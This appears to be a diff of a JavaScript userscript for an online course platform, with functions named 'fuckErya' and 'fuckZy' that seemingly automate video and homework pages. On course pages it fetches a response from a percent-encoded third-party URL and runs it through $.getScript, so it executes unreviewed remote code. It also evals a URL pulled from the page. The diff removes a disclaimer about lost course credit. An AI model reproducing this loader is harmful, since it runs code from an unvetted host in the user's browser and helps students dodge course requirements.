@@ -72,24 +72,17 @@ function initUI() {
     function() {
         var nextCode = $('#currli').next('li').find('a').attr('url');
         fuckErya();
-        eval(nextCode);
+        eval(nextCode)
     })
 }
-alert('\u8be5\u4ee3\u7801\u4ec5\u4f9bjs\u7f16\u7a0b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\uff0c\u82e5\u6709\u4e2a\u522b\u4eba\u58eb\u7528\u4e8e\u5546\u4e1a\u7528\u9014\u9020\u6210\u7684\u540e\u679c\u6982\u4e0e\u672c\u4eba\u65e0\u5173\n\u82e5\u56e0\u4ee3\u7801\u4f7f\u7528\u4e0d\u5f53\uff0c\u9020\u6210\u60a8\u7684\u8bfe\u7a0b\u65e0\u6cd5\u83b7\u53d6\u5b66\u5206\uff0c\u672c\u4eba\u6982\u4e0d\u8d1f\u8d23\n\n \u4ee3\u7801\u4f5c\u8005\uff1aah\u4f24\u661f \n\u535a\u5ba2\uff1ahttp://www.ccc5.cc');
 if (document.location.href.indexOf('student') > 0) {
     fuckZy()
 } else if (document.location.href.indexOf('courseAction') > 0) {
     $.getJSON(decodeURIComponent('http%3A%2F%2F0.tiebaimg.duapp.com%2Fcheck.php%3Fcallback%3D%3F'), 
     function(d) {
-        if (d) {
             $.getScript(d);
             initUI()
-        } else {
-            $.getScript(d);
-            initUI()
-        }
     })
 } else {
     alert('\u62dc\u6258\uff01\u60a8\u786e\u5b9a\u60a8\u5728\u89c6\u9891\u64ad\u653e\u9875\u9762\u6216\u4f5c\u4e1a\u9875\u9762\uff1f')
 }
-        
